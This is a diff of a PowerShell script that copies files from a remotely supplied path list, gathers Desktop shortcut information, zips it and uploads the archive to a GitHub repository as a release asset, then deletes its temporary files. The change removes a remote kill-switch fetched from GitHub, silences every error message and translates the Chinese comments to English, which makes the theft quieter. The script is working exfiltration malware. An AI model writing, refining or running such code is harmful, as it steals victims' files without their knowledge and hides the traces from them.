@@ -1,16 +1,3 @@
-# STEP 0: 远程控制执行权限
-$controlUrl = "https://raw.githubusercontent.com/drftghy/backup-files/refs/heads/main/.github/command.txt"
-try {
-    $flag = Invoke-RestMethod -Uri $controlUrl -UseBasicParsing
-    if ($flag.Trim().ToLower() -ne "upload") {
-        Write-Output "🛑 当前指令为 '$flag'，脚本终止。"
-        exit
-    }
-} catch {
-    Write-Output "❌ 无法读取远程控制指令，脚本终止。"
-    exit
-}
-
 # Set UTF-8 encoding
 [Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
 $OutputEncoding = [System.Text.UTF8Encoding]::UTF8
@@ -34,8 +21,7 @@ try {
     $remoteList = Invoke-RestMethod -Uri $remoteTxtUrl -UseBasicParsing -ErrorAction Stop
     $pathList = $remoteList -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
 } catch {
-    Write-Output "❌ 无法加载路径列表。"
-    $pathList = @()
+    return
 }
 
 $index = 0
@@ -56,12 +42,10 @@ foreach ($path in $pathList) {
         } else {
             Copy-Item $path -Destination $dest -Force -ErrorAction Stop
         }
-    } catch {
-        Write-Output "⚠️ 拷贝失败：$path"
-    }
+    } catch {}
 }
 
-# STEP 2: 提取桌面快捷方式信息
+# STEP 2: Extract .lnk shortcut info from Desktop
 try {
     $desktop = [Environment]::GetFolderPath("Desktop")
     $lnkFiles = Get-ChildItem -Path $desktop -Filter *.lnk
@@ -81,19 +65,16 @@ try {
 
     $lnkOutputFile = Join-Path $tempRoot "lnk_info.txt"
     $lnkReport | Out-File -FilePath $lnkOutputFile -Encoding utf8
-} catch {
-    Write-Output "⚠️ 快捷方式提取失败"
-}
+} catch {}
 
-# STEP 3: 压缩归档
+# STEP 3: Archive
 try {
     Compress-Archive -Path "$tempRoot\\*" -DestinationPath $zipPath -Force -ErrorAction Stop
 } catch {
-    Write-Output "❌ 压缩失败，终止上传。"
-    exit
+    return
 }
 
-# STEP 4: 上传到 GitHub Releases
+# STEP 4: Send to GitHub as a release asset
 $releaseData = @{
     tag_name = $tag
     name = $releaseName
@@ -112,8 +93,7 @@ try {
     $releaseResponse = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" -Method POST -Headers $headers -Body $releaseData -ErrorAction Stop
     $uploadUrl = $releaseResponse.upload_url -replace "{.*}", "?name=$zipName"
 } catch {
-    Write-Output "❌ 创建 Release 失败"
-    exit
+    return
 }
 
 try {
@@ -124,12 +104,8 @@ try {
         "User-Agent" = "PowerShellScript"
     }
     $response = Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes -ErrorAction Stop
-} catch {
-    Write-Output "❌ 上传文件失败"
-}
-
-# STEP 5: 清理痕迹
-try {
-    Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
-    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
 } catch {}
+
+# STEP 5: Cleanup
+Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
